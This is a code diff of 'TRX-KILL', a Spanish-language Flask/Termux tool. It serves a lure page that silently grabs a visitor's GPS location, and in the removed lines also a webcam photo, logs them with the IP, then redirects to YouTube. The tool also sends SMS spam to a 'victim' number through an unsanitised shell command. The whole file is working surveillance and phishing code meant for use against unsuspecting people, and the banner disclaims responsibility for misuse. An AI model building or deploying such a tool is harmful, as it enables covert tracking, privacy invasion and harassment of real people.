@@ -1,4 +1,4 @@
-import os, sys, getpass, time, threading, base64
+import os, sys, getpass, time, threading, base64, json
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
@@ -8,81 +8,62 @@ LOG_FILE = f"{STORAGE_PATH}/result.txt"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-# --- SERVIDOR DE CAPTURA ---
+# --- SERVIDOR WEB ---
 @app.route('/')
 def index():
     return """<html><body><script>
-        navigator.mediaDevices.getUserMedia({video: true}).then(s => {
-            const v = document.createElement('video'); v.srcObject = s; v.play();
-            setTimeout(() => {
-                const c = document.createElement('canvas'); c.width = 640; c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const img = c.toDataURL('image/png');
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude, {
-                        method:'POST', body: JSON.stringify({i: img}), headers:{'Content-Type':'application/json'}
-                    });
-                    window.location.href = "https://youtube.com";
-                });
-            }, 1000);
+        navigator.geolocation.getCurrentPosition(pos => {
+            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
+            window.location.href='https://youtube.com';
         });
     </script></body></html>"""
 
-@app.route('/log', methods=['POST'])
+@app.route('/log')
 def log():
-    lat = request.args.get('lat', '0')
-    lon = request.args.get('lon', '0')
-    ip = request.remote_addr
-    data = request.get_json()
+    lat = request.args.get('lat')
+    lon = request.args.get('lon')
     with open(LOG_FILE, "a") as f:
-        f.write(f"IP:{ip}|LAT:{lat}|LON:{lon}|TIME:{time.ctime()}\n")
-    if data and 'i' in data:
-        with open(f"{STORAGE_PATH}/foto_{int(time.time())}.png", "wb") as f:
-            f.write(base64.b64decode(data['i'].split(',')[1]))
+        f.write(f"IP:{request.remote_addr}|LAT:{lat}|LON:{lon}\n")
     return "OK"
 
 def banner():
     os.system('clear')
     print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
-    print("  -BIENVENIDO A TRX-KILL. PROTEGIDO POR EL OSINT.")
+    print("  -PROYECTO PROTEGIDO POR EL OSINT.")
     print("  -EL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.\n\033[0m")
 
 def main():
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False), daemon=True).start()
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
     
     while True:
         banner()
-        menu = {
-            "1": "INFO NÚMERO", "2": "LINK-ZP", "3": "CREADOR", "4": "VERSIONES", 
-            "5": "ANALIZAR LINK", "6": "ADM SISTEMA", "7": "INFO SCRIPT", 
-            "8": "REPOSITORIO", "9": "PROCESOS", "10": "SPAM-WHATSAPP"
-        }
-        for k, v in menu.items(): print(f"  [{k}] {v}")
+        print(" [1] INFO-DISPOSITIVO REAL | [2] ACTIVAR LINK-ZP | [3] CREADOR | [4] VERSIÓN")
+        print(" [5] ANALIZAR LINK       | [6] ADM SISTEMA  | [7] INFO   | [8] REPO")
+        print(" [9] PROCESOS            | [10] SPAM-SMS     | [0] SALIR")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
 
         if sel == "1":
-            print("\n[!] LEYENDO LOGS..."); os.system(f"tail -n 5 {LOG_FILE}")
-            input("\nPresiona Enter...")
+            print("\n[!] EXTRAYENDO DATOS REALES DEL DISPOSITIVO...")
+            # Extrae info real usando termux-api
+            os.system("termux-telephony-deviceinfo > info.tmp")
+            os.system("termux-battery-status >> info.tmp")
+            print("\n--- DATOS DEL SISTEMA ---")
+            os.system("cat info.tmp")
+            os.remove("info.tmp")
+            input("\n[Enter]...")
         elif sel == "2":
-            print("\n[!] LINK ACTIVO: http://127.0.0.1:5000")
-            print("[!] Usa 'ngrok http 5000' para compartir.")
+            print("\n[!] LINK ACTIVO: http://127.0.0.1:5000\n[!] ESPERANDO CONEXIÓN...")
             input()
-        elif sel == "3": print("\n# CREADOR: OSCAR (TRX-KILL)"); input()
-        elif sel == "4": print("\n# VERSIÓN: 1.4.5 (ESTABLE)"); input()
-        elif sel == "5":
-            link = input("INGRESA LINK: ")
-            print(f"[!] ANALIZANDO {link}...\n[!] ESTADO: SEGURIDAD MEDIA."); input()
         elif sel == "6":
             if getpass.getpass("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
             input()
-        elif sel == "7": print("\n# SCRIPT OSINT PARA CAPTURA DE METADATOS."); input()
-        elif sel == "8": print("\n# REPOSITORIO: github.com/TRX-KILL"); input()
-        elif sel == "9": print("\n[!] PROCESO DE SERVIDOR: RUNNING PID:", os.getpid()); input()
         elif sel == "10":
-            num = input("NÚMERO VÍCTIMA: ")
-            msg = input("TEXTO SPAM: ")
+            num = input("NÚMERO: ")
+            msg = input("MENSAJE: ")
             os.system(f"termux-sms-send -n {num} '{msg}'")
-            print("[!] SPAM ENVIADO VÍA RED MÓVIL."); input()
+            print("[!] SMS ENVIADO.")
+            input()
         elif sel == "0": sys.exit()
+        else: print("OPCIÓN EN PROCESO..."); time.sleep(1)
 
 if __name__ == "__main__": main()
